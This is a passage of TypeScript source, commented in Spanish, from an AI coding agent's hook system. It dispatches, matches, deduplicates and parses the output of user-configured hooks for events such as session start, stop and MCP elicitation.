    // Maneja errores de la escritura de stdin o del proceso hijo
    const code = getErrnoCode(error)
    diagExitCode = 1

    if (code === 'EPIPE') {
      logForDebugging(
        'EPIPE error while writing to hook stdin (hook command likely closed early)',
      )
      const errMsg =
        'Hook command closed stdin before hook input was fully written (EPIPE)'
      return {
        stdout: '',
        stderr: errMsg,
        output: errMsg,
        status: 1,
      }
    } else if (code === 'ABORT_ERR') {
      diagAborted = true
      return {
        stdout: '',
        stderr: 'Hook cancelled',
        output: 'Hook cancelled',
        status: 1,
        aborted: true,
      }
    } else {
      const errorMsg = errorMessage(error)
      const errOutput = `Error occurred while executing hook command: ${errorMsg}`
      return {
        stdout: '',
        stderr: errOutput,
        output: errOutput,
        status: 1,
      }
    }
  } finally {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_completed', {
        hook_event_name: hookEvent,
        index: hookIndex,
        duration_ms: Date.now() - diagStartMs,
        exit_code: diagExitCode,
        aborted: diagAborted,
      })
    }
    stopProgressInterval()
    // Limpia recursos de stream salvo que la propiedad se haya transferido
    // (p. ej. al registro de hooks asíncronos)
    if (!shellCommandTransferred) {
      shellCommand.cleanup()
    }
    // Limpia artefactos de sandbox (p. ej. archivos de punto de montaje de bwrap en Linux)
    if (sandboxedCommand !== finalCommand) {
      SandboxManager.cleanupAfterCommand()
    }
  }
}
export async function executeElicitationHooks({
  serverName,
  message,
  requestedSchema,
  permissionMode,
  signal,
  timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  mode,
  url,
  elicitationId,
}: {
  serverName: string
  message: string
  requestedSchema?: Record<string, unknown>
  permissionMode?: string
  signal?: AbortSignal
  timeoutMs?: number
  mode?: 'form' | 'url'
  url?: string
  elicitationId?: string
}): Promise<ElicitationHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'Elicitation',
    mcp_server_name: serverName,
    message,
    mode,
    url,
    elicitation_id: elicitationId,
    requested_schema: requestedSchema,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: serverName,
    signal,
    timeoutMs,
  })

  let elicitationResponse: ElicitationResponse | undefined
  let blockingError: HookBlockingError | undefined

  for (const result of results) {
    const parsed = parseElicitationHookOutput(result, 'Elicitation')
    if (parsed.blockingError) {
      blockingError = parsed.blockingError
    }
    if (parsed.response) {
      elicitationResponse = parsed.response
    }
  }

  return { elicitationResponse, blockingError }
}
export async function executeElicitationResultHooks({
  serverName,
  action,
  content,
  permissionMode,
  signal,
  timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  mode,
  elicitationId,
}: {
  serverName: string
  action: 'accept' | 'decline' | 'cancel'
  content?: Record<string, unknown>
  permissionMode?: string
  signal?: AbortSignal
  timeoutMs?: number
  mode?: 'form' | 'url'
  elicitationId?: string
}): Promise<ElicitationResultHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'ElicitationResult',
    mcp_server_name: serverName,
    elicitation_id: elicitationId,
    mode,
    action,
    content,
  }

  const results = await executeHooksOutsideREPL({
    hookInput,
    matchQuery: serverName,
    signal,
    timeoutMs,
  })

  let elicitationResultResponse: ElicitationResponse | undefined
  let blockingError: HookBlockingError | undefined

  for (const result of results) {
    const parsed = parseElicitationHookOutput(result, 'ElicitationResult')
    if (parsed.blockingError) {
      blockingError = parsed.blockingError
    }
    if (parsed.response) {
      elicitationResultResponse = parsed.response
    }
  }

  return { elicitationResultResponse, blockingError }
}
/**
 * Pone un hook a correr en segundo plano: lo saca del camino bloqueante y
 * registra su seguimiento en el registro de hooks asíncronos. Devuelve
 * `false` si el comando ya no estaba en estado `running`.
 */
function executeInBackground({
  processId,
  hookId,
  shellCommand,
  asyncResponse,
  hookEvent,
  hookName,
  command,
  asyncRewake,
  pluginId,
}: {
  processId: string
  hookId: string
  shellCommand: ShellCommand
  asyncResponse: AsyncHookJSONOutput
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion'
  hookName: string
  command: string
  asyncRewake?: boolean
  pluginId?: string
}): boolean {
  if (asyncRewake) {
    // Los hooks asyncRewake saltan el registro por completo. Al terminar, si
    // el exit code es 2 (error de bloqueo), se encolan como task-notification
    // para despertar al modelo vía useQueueProcessor (idle) o inyectarse a
    // media consulta vía adjuntos queued_command (busy).
    //
    // NOTA: deliberadamente NO se llama a shellCommand.background() aquí,
    // porque eso invoca taskOutput.spillToDisk(), que rompe la captura en
    // memoria de stdout/stderr (getStderr() devuelve '' en modo disco). Los
    // StreamWrapper siguen conectados y vuelcan datos en los buffers de
    // TaskOutput en memoria. El manejador de abort ya no hace nada con la
    // razón 'interrupt' (el usuario envió un mensaje nuevo), así que el hook
    // sobrevive a mensajes nuevos. Una cancelación dura (Escape) SÍ mata el
    // hook vía el manejador de abort, que es el comportamiento deseado.
    void shellCommand.result.then(async result => {
      // El result se resuelve en 'exit', pero los eventos 'data' de stdio
      // pueden seguir pendientes. Se cede el turno al I/O para que los
      // manejadores de datos del StreamWrapper terminen de volcar en
      // TaskOutput antes de leerlo.
      await new Promise(resolve => setImmediate(resolve))
      const stdout = await shellCommand.taskOutput.getStdout()
      const stderr = shellCommand.taskOutput.getStderr()
      shellCommand.cleanup()
      emitHookResponse({
        hookId,
        hookName,
        hookEvent,
        output: stdout + stderr,
        stdout,
        stderr,
        exitCode: result.code,
        outcome: result.code === 0 ? 'success' : 'error',
      })
      if (result.code === 2) {
        enqueuePendingNotification({
          value: wrapInSystemReminder(
            `Stop hook blocking error from command "${hookName}": ${stderr || stdout}`,
          ),
          mode: 'task-notification',
        })
      }
    })
    return true
  }

  // El TaskOutput del ShellCommand acumula datos — no hacen falta listeners de stream
  if (!shellCommand.background(processId)) {
    return false
  }

  registerPendingAsyncHook({
    processId,
    hookId,
    asyncResponse,
    hookEvent,
    hookName,
    command,
    shellCommand,
    pluginId,
  })

  return true
}
/**
 * Ejecuta los hooks InstructionsLoaded cuando se carga un archivo de
 * instrucciones (CLAUDE.md o .claude/rules/*.md) en el contexto.
 * Fire-and-forget — sólo para observabilidad/auditoría, no soporta bloqueo.
 *
 * Sitios de despacho:
 * - Carga eager al inicio de sesión (getMemoryFiles en claudemd.ts)
 * - Recarga eager tras compactación (caché de getMemoryFiles limpiada por
 *   runPostCompactCleanup; la siguiente llamada reporta load_reason: 'compact')
 * - Carga lazy cuando Claude toca un archivo que dispara un CLAUDE.md anidado
 *   o reglas condicionales con frontmatter paths: (memoryFilesToAttachments en
 *   attachments.ts)
 */
export async function executeInstructionsLoadedHooks(
  filePath: string,
  memoryType: InstructionsMemoryType,
  loadReason: InstructionsLoadReason,
  options?: {
    globs?: string[]
    triggerFilePath?: string
    parentFilePath?: string
    timeoutMs?: number
  },
): Promise<void> {
  const {
    globs,
    triggerFilePath,
    parentFilePath,
    timeoutMs = TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  } = options ?? {}

  const hookInput = {
    ...createBaseHookInput(undefined),
    hook_event_name: 'InstructionsLoaded',
    file_path: filePath,
    memory_type: memoryType,
    load_reason: loadReason,
    globs,
    trigger_file_path: triggerFilePath,
    parent_file_path: parentFilePath,
  }

  await executeHooksOutsideREPL({
    hookInput,
    timeoutMs,
    matchQuery: loadReason,
  })
}
/**
 * Ejecuta los hooks SessionStart si están configurados.
 * @param source El origen del inicio de sesión (startup, resume, clear, compact)
 * @param sessionId Opcional. El id de sesión a usar como input del hook
 * @param agentType Opcional. El tipo de agente (flag --agent) que corre esta sesión
 * @param model Opcional. El modelo en uso para esta sesión
 * @param signal Opcional. AbortSignal para cancelar la ejecución del hook
 * @param timeoutMs Opcional. Timeout en milisegundos para la ejecución del hook
 * @returns Generador asíncrono que emite mensajes de progreso y resultados del hook
 */
export async function* executeSessionStartHooks(
  source: 'startup' | 'resume' | 'clear' | 'compact',
  sessionId?: string,
  agentType?: string,
  model?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
  forceSyncExecution?: boolean,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(undefined, sessionId),
    hook_event_name: 'SessionStart',
    source,
    agent_type: agentType,
    model,
  }

  yield* executeHooks({
    hookInput,
    toolUseID: crypto.randomUUID(),
    matchQuery: source,
    signal,
    timeoutMs,
    forceSyncExecution,
  })
}
/**
 * Corre los hooks `Setup` (init o maintenance). Con `forceSyncExecution` en
 * true, los hooks async no se mandan a segundo plano.
 */
export async function* executeSetupHooks(
  trigger: 'init' | 'maintenance',
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
  forceSyncExecution?: boolean,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = { ...createBaseHookInput(), hook_event_name: 'Setup', trigger }

  yield* executeHooks({
    hookInput,
    toolUseID: crypto.randomUUID(),
    matchQuery: trigger,
    signal,
    timeoutMs,
    forceSyncExecution,
  })
}
/**
 * StopFailure (fuera del bucle): el error final de un turno que no llegó a
 * producir una respuesta válida. `error_details` y `last_assistant_message`
 * dan al hook el mismo contexto que el binario expone.
 */
export async function executeStopFailureHooks(
  lastMessage: AgentMessage,
  toolUseContext?: unknown,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): Promise<void> {
  if (!hasHookForEvent('StopFailure')) return
  const rawContent = lastMessage.message?.content
  const lastAssistantText =
    (Array.isArray(rawContent)
      ? extractTextContent(rawContent as readonly { readonly type: string }[], '\n').trim()
      : typeof rawContent === 'string'
        ? rawContent.trim()
        : '') || undefined
  const error = (lastMessage.error as string | undefined) ?? 'unknown'
  const hookInput = {
    ...createBaseHookInput(permissionModeOf(toolUseContext)),
    hook_event_name: 'StopFailure',
    error,
    error_details: lastMessage.errorDetails,
    last_assistant_message: lastAssistantText,
  }
  await executeHooksOutsideREPL({ hookInput, matchQuery: error, timeoutMs })
}
/**
 * Corre los Stop/SubagentStop hooks configurados, si los hay. Extrae el
 * texto del último mensaje de asistente para que el hook pueda inspeccionar
 * la respuesta final sin leer el transcript.
 */
export async function* executeStopHooks(
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
  stopHookActive = false,
  subagentId?: string,
  toolUseContext?: unknown,
  messages?: Message[],
  agentType?: string,
): AsyncGenerator<AggregatedHookResult> {
  const hookEvent = subagentId ? 'SubagentStop' : 'Stop'
  if (!hasHookForEvent(hookEvent)) return

  const lastAssistantMessage = messages ? getLastAssistantMessage(messages) : undefined
  const lastAssistantContent = lastAssistantMessage?.message?.content
  const lastAssistantText = lastAssistantMessage
    ? (Array.isArray(lastAssistantContent)
        ? extractTextContent(lastAssistantContent as readonly { readonly type: string }[], '\n').trim()
        : typeof lastAssistantContent === 'string'
          ? lastAssistantContent.trim()
          : '') || undefined
    : undefined

  const hookInput: HookInputRecord = subagentId
    ? {
        ...createBaseHookInput(permissionMode),
        hook_event_name: 'SubagentStop',
        stop_hook_active: stopHookActive,
        agent_id: subagentId,
        agent_transcript_path: getAgentTranscriptPath(asAgentId(subagentId)),
        agent_type: agentType ?? '',
        last_assistant_message: lastAssistantText,
      }
    : {
        ...createBaseHookInput(permissionMode),
        hook_event_name: 'Stop',
        stop_hook_active: stopHookActive,
        last_assistant_message: lastAssistantText,
      }

  yield* executeHooks({ hookInput, toolUseID: crypto.randomUUID(), signal, timeoutMs, toolUseContext, messages })
}
/**
 * Ejecuta los hooks de TeammateIdle cuando un teammate está por quedar inactivo.
 * Si un hook bloquea (exit code 2), el teammate debe seguir trabajando en vez de quedar inactivo.
 * @param teammateName Nombre del teammate que va a quedar inactivo
 * @param teamName Equipo al que pertenece el teammate
 * @param permissionMode Modo de permiso opcional
 * @param signal AbortSignal opcional para cancelar la ejecución de hooks
 * @param timeoutMs Timeout opcional en milisegundos para la ejecución de hooks
 * @returns Generador async que emite mensajes de progreso y errores de bloqueo
 */
export async function* executeTeammateIdleHooks(
  teammateName: string,
  teamName: string,
  permissionMode?: string,
  signal?: AbortSignal,
  timeoutMs: number = DEFAULT_HOOK_TIMEOUT_MS,
): AsyncGenerator<AggregatedHookResult> {
  const hookInput = {
    ...createBaseHookInput(permissionMode),
    hook_event_name: 'TeammateIdle',
    teammate_name: teammateName,
    team_name: teamName,
  }

  yield* executeHooks({
    hookInput,
    toolUseID: crypto.randomUUID(),
    signal,
    timeoutMs,
  })
}
function getHooksConfig(
  appState: AppState | undefined,
  sessionId: string,
  hookEvent: HookEvent,
): Array<
  | HookMatcher
  | HookCallbackMatcher
  | FunctionHookMatcher
  | PluginHookMatcher
  | SkillHookMatcher
  | SessionDerivedHookMatcher
> {
  // HookMatcher es {matcher, hooks} sin el envoltorio de zod, así que los
  // matchers del snapshot se empujan directo sin volver a envolverlos.
  const rawHooks = getHooksConfigFromSnapshot()?.[hookEvent]
  const hooks: Array<
    | HookMatcher
    | HookCallbackMatcher
    | FunctionHookMatcher
    | PluginHookMatcher
    | SkillHookMatcher
    | SessionDerivedHookMatcher
  > = Array.isArray(rawHooks) ? [...rawHooks] : []

  // Si sólo deben correr los hooks administrados (aplica a los registrados y a los de sesión)
  const managedOnly = shouldAllowManagedHooksOnly()

  // Procesa los hooks registrados (callbacks del SDK y hooks nativos de plugin)
  const registeredHooks = getRegisteredHooks()?.[hookEvent]
  if (registeredHooks) {
    for (const matcher of registeredHooks) {
      // Salta los hooks de plugin cuando sólo se permiten los administrados
      // Los hooks de plugin llevan pluginRoot; los callbacks del SDK no
      if (managedOnly && 'pluginRoot' in matcher) {
        continue
      }
      hooks.push(matcher)
    }
  }

  // Combina los hooks de sesión sólo de la sesión actual
  // Los hooks de función (como la validación de salida estructurada) tienen que quedar acotados
  // a su sesión para que no se filtren de un agente a otro (del agente de verificación al principal).
  // Se saltan por completo cuando allowManagedHooksOnly está activo —
  // así se evita que los hooks de frontmatter de agentes/skills salten la política.
  // strictPluginOnlyCustomization NO bloquea aquí — actúa en los sitios de
  // REGISTRO (runAgent.ts:526 para hooks de frontmatter de agente), donde
  // agentDefinition.source es conocido. Bloquear aquí también mataría los
  // hooks de frontmatter de los agentes provistos por plugin, que es demasiado amplio.
  // También se salta si appState no viene (por compatibilidad retroactiva).
  if (!managedOnly && appState !== undefined) {
    const sessionHooks = getSessionHooks(appState, sessionId, hookEvent).get(
      hookEvent,
    )
    if (sessionHooks) {
      // SessionDerivedHookMatcher ya incluye el skillRoot opcional
      for (const matcher of sessionHooks) {
        hooks.push(matcher)
      }
    }

    // Combina los hooks de función de sesión por separado (no se pueden persistir en formato HookMatcher)
    const sessionFunctionHooks = getSessionFunctionHooks(
      appState,
      sessionId,
      hookEvent,
    ).get(hookEvent)
    if (sessionFunctionHooks) {
      for (const matcher of sessionFunctionHooks) {
        hooks.push(matcher)
      }
    }
  }

  return hooks
}
/**
 * Construye la clave de deduplicación de un hook emparejado, con espacio de
 * nombres por contexto de origen.
 *
 * Los hooks de `settings.json` (sin `pluginRoot`/`skillRoot`) comparten el
 * prefijo '' para que el mismo comando definido en user/project/local siga
 * colapsando a uno solo — la intención original del dedup. Los hooks de
 * plugin/skill llevan su raíz como prefijo, así que dos plugins que
 * comparten una plantilla `${CLAUDE_PLUGIN_ROOT}/hook.sh` sin expandir no
 * colapsan: tras la expansión apuntan a archivos distintos.
 */
function hookDedupKey(m: MatchedHook, payload: string): string {
  return `${m.pluginRoot ?? m.skillRoot ?? ''}\0${payload}`
}

/**
 * Obtiene los comandos de hook que casan con la consulta dada.
 * @param appState El estado actual de la app (opcional, por compatibilidad retro)
 * @param sessionId El ID de la sesión actual (sesión principal o ID de agente)
 * @param hookEvent El evento de hook
 * @param hookInput La entrada del hook para el matching
 * @returns Array de hooks casados con su contexto de plugin opcional
 */
export async function getMatchingHooks(
  appState: AppState | undefined,
  sessionId: string,
  hookEvent: HookEvent,
  hookInput: HookInput,
  tools?: Tools,
): Promise<MatchedHook[]> {
  try {
    const hookMatchers = getHooksConfig(appState, sessionId, hookEvent)

    // Si cambias el criterio de abajo, hay que cambiar también
    // src/utils/hooks/hooksConfigManager.ts.
    let matchQuery: string | undefined
    switch (hookInput.hook_event_name) {
      case 'PreToolUse':
      case 'PostToolUse':
      case 'PostToolUseFailure':
      case 'PermissionRequest':
      case 'PermissionDenied':
        matchQuery = hookInput.tool_name as string
        break
      case 'SessionStart':
        matchQuery = hookInput.source as string
        break
      case 'Setup':
        matchQuery = hookInput.trigger as string
        break
      case 'PreCompact':
      case 'PostCompact':
        matchQuery = hookInput.trigger as string
        break
      case 'Notification':
        matchQuery = hookInput.notification_type as string
        break
      case 'SessionEnd':
        matchQuery = hookInput.reason as string
        break
      case 'StopFailure':
        matchQuery = hookInput.error as string
        break
      case 'SubagentStart':
        matchQuery = hookInput.agent_type as string
        break
      case 'SubagentStop':
        matchQuery = hookInput.agent_type as string
        break
      case 'TeammateIdle':
      case 'TaskCreated':
      case 'TaskCompleted':
        break
      case 'Elicitation':
        matchQuery = hookInput.mcp_server_name as string
        break
      case 'ElicitationResult':
        matchQuery = hookInput.mcp_server_name as string
        break
      case 'ConfigChange':
        matchQuery = hookInput.source as string
        break
      case 'InstructionsLoaded':
        matchQuery = hookInput.load_reason as string
        break
      case 'FileChanged':
        matchQuery = basename(hookInput.file_path as string)
        break
      default:
        break
    }

    logForDebugging(
      `Getting matching hook commands for ${hookEvent} with query: ${matchQuery}`,
      { level: 'verbose' },
    )
    logForDebugging(`Found ${hookMatchers.length} hook matchers in settings`, {
      level: 'verbose',
    })

    // Extrae los hooks con su contexto de plugin (si lo hay)
    const filteredMatchers = matchQuery
      ? hookMatchers.filter(
          matcher =>
            !matcher.matcher || matchesPattern(matchQuery, matcher.matcher),
        )
      : hookMatchers

    const matchedHooks: MatchedHook[] = filteredMatchers.flatMap(matcher => {
      // Comprueba si es un PluginHookMatcher (tiene pluginRoot) o un SkillHookMatcher (tiene skillRoot)
      const pluginRoot =
        'pluginRoot' in matcher ? matcher.pluginRoot : undefined
      const pluginId = 'pluginId' in matcher ? matcher.pluginId : undefined
      const skillRoot = 'skillRoot' in matcher ? matcher.skillRoot : undefined
      const hookSource = pluginRoot
        ? 'pluginName' in matcher
          ? `plugin:${matcher.pluginName}`
          : 'plugin'
        : skillRoot
          ? 'skillName' in matcher
            ? `skill:${matcher.skillName}`
            : 'skill'
          : 'settings'
      return matcher.hooks.map(hook => ({
        hook,
        pluginRoot,
        pluginId,
        skillRoot,
        hookSource,
      }))
    })

    // Deduplica hooks por comando/prompt/url dentro del mismo contexto de origen.
    // La clave lleva el espacio de nombres por pluginRoot/skillRoot (ver hookDedupKey
    // arriba) para que colisiones de plantilla entre plugins no descarten hooks (gh-29724).
    //
    // Nota: new Map(entries) conserva la ÚLTIMA entrada en colisión de clave, no la primera.
    // Para hooks de settings esto significa que gana el último scope fusionado; para
    // duplicados del mismo plugin el pluginRoot es idéntico así que no importa.
    // Camino rápido: los hooks de callback/función no necesitan dedup (cada uno es único).
    // Se salta el filtro de 6 pasadas + 4×Map + 4×Array.from de abajo cuando todos los
    // hooks son callback/function — el caso común de hooks internos como
    // sessionFileAccessHooks/attributionHooks (44x más rápido en microbench).
    if (
      matchedHooks.every(
        m => m.hook.type === 'callback' || m.hook.type === 'function',
      )
    ) {
      return matchedHooks
    }

    // Auxiliar para extraer la condición `if` de un hook para las claves de dedup.
    // Hooks con distinta condición `if` son distintos aunque sean idénticos en lo demás.
    const getIfCondition = (hook: { if?: string }): string => hook.if ?? ''

    const uniqueCommandHooks = Array.from(
      new Map(
        matchedHooks
          .filter(
            (
              m,
            ): m is MatchedHook & { hook: HookCommand & { type: 'command' } } =>
              m.hook.type === 'command',
          )
          // shell es parte de la identidad: {command:'echo x', shell:'bash'}
          // y {command:'echo x', shell:'powershell'} son hooks distintos,
          // no duplicados. Por defecto 'bash' para que las configs antiguas
          // (sin campo shell) sigan deduplicando contra shell:'bash' explícito.
          .map(m => [
            hookDedupKey(
              m,
              `${m.hook.shell ?? DEFAULT_HOOK_SHELL}\0${m.hook.command}\0${getIfCondition(m.hook)}`,
            ),
            m,
          ]),
      ).values(),
    )
    const uniquePromptHooks = Array.from(
      new Map(
        matchedHooks
          .filter(m => m.hook.type === 'prompt')
          .map(m => [
            hookDedupKey(
              m,
              `${(m.hook as { prompt: string }).prompt}\0${getIfCondition(m.hook as { if?: string })}`,
            ),
            m,
          ]),
      ).values(),
    )
    const uniqueAgentHooks = Array.from(
      new Map(
        matchedHooks
          .filter(m => m.hook.type === 'agent')
          .map(m => [
            hookDedupKey(
              m,
              `${(m.hook as { prompt: string }).prompt}\0${getIfCondition(m.hook as { if?: string })}`,
            ),
            m,
          ]),
      ).values(),
    )
    const uniqueHttpHooks = Array.from(
      new Map(
        matchedHooks
          .filter(m => m.hook.type === 'http')
          .map(m => [
            hookDedupKey(
              m,
              `${(m.hook as { url: string }).url}\0${getIfCondition(m.hook as { if?: string })}`,
            ),
            m,
          ]),
      ).values(),
    )
    const callbackHooks = matchedHooks.filter(m => m.hook.type === 'callback')
    // Los hooks de función no necesitan deduplicación — cada callback es único
    const functionHooks = matchedHooks.filter(m => m.hook.type === 'function')
    const uniqueHooks = [
      ...uniqueCommandHooks,
      ...uniquePromptHooks,
      ...uniqueAgentHooks,
      ...uniqueHttpHooks,
      ...callbackHooks,
      ...functionHooks,
    ]

    // Filtra hooks según su condición `if`. Esto permite que un hook especifique
    // condiciones como "Bash(git *)" para correr sólo con comandos git, evitando
    // el overhead de lanzar procesos para lo que no casa.
    const hasIfCondition = uniqueHooks.some(
      h =>
        (h.hook.type === 'command' ||
          h.hook.type === 'prompt' ||
          h.hook.type === 'agent' ||
          h.hook.type === 'http') &&
        (h.hook as { if?: string }).if,
    )
    const ifMatcher = hasIfCondition
      ? await prepareIfConditionMatcher(hookInput, tools)
      : undefined
    const ifFilteredHooks = uniqueHooks.filter(h => {
      if (
        h.hook.type !== 'command' &&
        h.hook.type !== 'prompt' &&
        h.hook.type !== 'agent' &&
        h.hook.type !== 'http'
      ) {
        return true
      }
      const ifCondition = (h.hook as { if?: string }).if
      if (!ifCondition) {
        return true
      }
      if (!ifMatcher) {
        logForDebugging(
          `Hook if condition "${ifCondition}" cannot be evaluated for non-tool event ${hookInput.hook_event_name}`,
        )
        return false
      }
      if (ifMatcher(ifCondition)) {
        return true
      }
      logForDebugging(
        `Skipping hook due to if condition "${ifCondition}" not matching`,
      )
      return false
    })

    // Los hooks HTTP no están soportados para eventos SessionStart/Setup. En modo
    // headless, el callback de sandbox ask hace deadlock porque el consumidor de
    // structuredInput aún no arrancó cuando estos hooks disparan.
    const filteredHooks =
      hookEvent === 'SessionStart' || hookEvent === 'Setup'
        ? ifFilteredHooks.filter(h => {
            if (h.hook.type === 'http') {
              logForDebugging(
                `Skipping HTTP hook ${(h.hook as { url: string }).url} — HTTP hooks are not supported for ${hookEvent}`,
              )
              return false
            }
            return true
          })
        : ifFilteredHooks

    logForDebugging(
      `Matched ${filteredHooks.length} unique hooks for query "${matchQuery || 'no match query'}" (${matchedHooks.length} before deduplication)`,
      { level: 'verbose' },
    )
    return filteredHooks
  } catch {
    return []
  }
}
/**
 * Comprueba si hay hooks de InstructionsLoaded configurados (sin ejecutarlos).
 * Quien llama debería comprobar esto antes de invocar executeInstructionsLoadedHooks
 * para evitar construir hook inputs por cada archivo de instrucciones cuando no hay
 * ningún hook configurado.
 *
 * Comprueba tanto los hooks de settings-file (getHooksConfigFromSnapshot) como los
 * hooks registrados (plugin hooks + SDK callback hooks vía registerHookCallbacks).
 * Los hooks derivados de la sesión (structured output enforcement, etc.) son
 * internos y no se comprueban.
 */
export function hasInstructionsLoadedHook(): boolean {
  const snapshotHooks = getHooksConfigFromSnapshot()['InstructionsLoaded']
  if (Array.isArray(snapshotHooks) && snapshotHooks.length > 0) return true
  const registeredHooks = getRegisteredHooks()?.['InstructionsLoaded']
  if (registeredHooks && registeredHooks.length > 0) return true
  return false
}
/**
 * Comprueba si una query de match coincide con el patrón de un matcher de hook.
 * @param matchQuery La query a comparar (p.ej. 'Write', 'Edit', 'Bash')
 * @param matcher El patrón del matcher - puede ser:
 *   - Cadena simple para coincidencia exacta (p.ej. 'Write')
 *   - Lista separada por pipes para varias coincidencias exactas (p.ej. 'Write|Edit')
 *   - Patrón regex (p.ej. '^Write.*', '.*', '^(Write|Edit)$')
 * @returns true si la query coincide con el patrón
 */
function matchesPattern(matchQuery: string, matcher: string): boolean {
  if (!matcher || matcher === '*') {
    return true
  }
  // Comprueba si es una cadena simple o una lista separada por pipes (sin caracteres especiales de regex salvo |)
  if (/^[a-zA-Z0-9_|]+$/.test(matcher)) {
    // Maneja coincidencias exactas separadas por pipes
    if (matcher.includes('|')) {
      const patterns = matcher
        .split('|')
        .map(p => normalizeLegacyToolName(p.trim()))
      return patterns.includes(matchQuery)
    }
    // Coincidencia exacta simple
    return matchQuery === normalizeLegacyToolName(matcher)
  }

  // En otro caso, se trata como regex
  try {
    const regex = new RegExp(matcher)
    if (regex.test(matchQuery)) {
      return true
    }
    // También prueba contra los nombres legacy para que patrones como "^Task$" sigan coincidiendo
    for (const legacyName of getLegacyToolNames(matchQuery)) {
      if (regex.test(legacyName)) {
        return true
      }
    }
    return false
  } catch {
    // Si el regex es inválido, registra el error y retorna false
    logForDebugging(`Invalid regex pattern in hook matcher: ${matcher}`)
    return false
  }
}
/**
 * Representación tipada de la salida síncrona de un hook, acotada a los
 * campos que `parseElicitationHookOutput` lee — puerto parcial del
 * `TypedSyncHookOutput` de la fuente (`ccnmt: packages/agent/hooks.ts:558`),
 * cuya unión discriminada completa depende de `PermissionRequestResult`, un
 * tipo que este árbol no porta.
 */
type TypedSyncHookOutput = {
  decision?: string
  reason?: string
  hookSpecificOutput?: {
    hookEventName?: string
    [key: string]: unknown
  }
}

/**
 * Extrae los campos de elicitation de un HookOutsideReplResult.
 * Refleja las ramas relevantes del procesamiento de salida JSON de hooks
 * para los eventos Elicitation y ElicitationResult.
 */
function parseElicitationHookOutput(
  result: HookOutsideReplResult,
  expectedEventName: 'Elicitation' | 'ElicitationResult',
): {
  response?: ElicitationResponse
  blockingError?: HookBlockingError
} {
  // Exit code 2 = bloqueo (mismo camino que executeHooks)
  if (result.blocked && !result.succeeded) {
    return {
      blockingError: {
        blockingError: result.output || `Elicitation blocked by hook`,
        command: result.command,
      },
    }
  }

  if (!result.output.trim()) {
    return {}
  }

  // Intenta parsear la salida JSON para una respuesta de elicitation estructurada
  const trimmed = result.output.trim()
  if (!trimmed.startsWith('{')) {
    return {}
  }

  try {
    const parsed = hookJSONOutputSchema().parse(JSON.parse(trimmed))
    if (isAsyncHookJSONOutput(parsed)) {
      return {}
    }
    if (!isSyncHookJSONOutput(parsed)) {
      return {}
    }

    // Cast a la interfaz tipada para acceso type-safe a propiedades
    const typedParsed = parsed as TypedSyncHookOutput

    // Decisión de nivel superior: 'block' (exit code 0 + bloqueo JSON)
    if (typedParsed.decision === 'block' || result.blocked) {
      return {
        blockingError: {
          blockingError: typedParsed.reason || 'Elicitation blocked by hook',
          command: result.command,
        },
      }
    }

    const specific = typedParsed.hookSpecificOutput
    if (!specific || specific.hookEventName !== expectedEventName) {
      return {}
    }

    if (!('action' in specific) || !(specific as { action?: string }).action) {
      return {}
    }

    const typedSpecific = specific as { action: string; content?: Record<string, unknown> }
    const response: ElicitationResponse = {
      action: typedSpecific.action as ElicitationResponse['action'],
      content: typedSpecific.content as ElicitationResponse['content'] | undefined,
    }

    const out: {
      response?: ElicitationResponse
      blockingError?: HookBlockingError
    } = { response }

    if (typedSpecific.action === 'decline') {
      out.blockingError = {
        blockingError:
          typedParsed.reason ||
          (expectedEventName === 'Elicitation'
            ? 'Elicitation denied by hook'
            : 'Elicitation result blocked by hook'),
        command: result.command,
      }
    }

    return out
  } catch {
    return {}
  }
}
/**
 * Prepara un matcher para las condiciones `if` de un hook. El trabajo caro
 * (búsqueda de herramienta, validación con Zod, parseo tree-sitter para
 * Bash) ocurre una sola vez aquí; el closure devuelto se llama por hook.
 * Devuelve `undefined` para eventos que no son de herramienta.
 */
async function prepareIfConditionMatcher(
  hookInput: HookInput,
  tools: Tools | undefined,
): Promise<IfConditionMatcher | undefined> {
  if (
    hookInput.hook_event_name !== 'PreToolUse' &&
    hookInput.hook_event_name !== 'PostToolUse' &&
    hookInput.hook_event_name !== 'PostToolUseFailure' &&
    hookInput.hook_event_name !== 'PermissionRequest'
  ) {
    return undefined
  }

  const toolName = normalizeLegacyToolName(hookInput.tool_name as string)
  const tool = tools && findToolByName(tools, hookInput.tool_name as string)
  const input = tool?.inputSchema.safeParse(hookInput.tool_input)
  const patternMatcher =
    input?.success && tool?.preparePermissionMatcher
      ? await tool.preparePermissionMatcher(input.data)
      : undefined

  return ifCondition => {
    const parsed = permissionRuleValueFromString(ifCondition)
    if (normalizeLegacyToolName(parsed.toolName) !== toolName) {
      return false
    }
    if (!parsed.ruleContent) {
      return true
    }
    return patternMatcher ? patternMatcher(parsed.ruleContent) : false
  }
}
/**
 * Comprueba si un hook debe omitirse por falta de confianza del workspace.
 *
 * TODOS los hooks requieren confianza del workspace porque ejecutan comandos
 * arbitrarios definidos en `.claude/settings.json`. Es una medida de defensa
 * en profundidad.
 *
 * Contexto: los hooks se capturan vía `captureHooksConfigSnapshot()` antes de
 * mostrar el diálogo de confianza. Aunque la mayoría no se ejecuta hasta que
 * la confianza queda establecida por el flujo normal del programa, exigirla
 * para TODOS los hooks previene:
 * - futuros errores donde un hook se ejecute antes de la confianza,
 * - cualquier ruta de código que dispare hooks antes del diálogo,
 * - problemas de seguridad por ejecución de hooks en workspaces no confiados.
 *
 * Vulnerabilidades históricas que motivaron esta comprobación:
 * - hooks de SessionEnd ejecutándose cuando el usuario rechaza el diálogo,
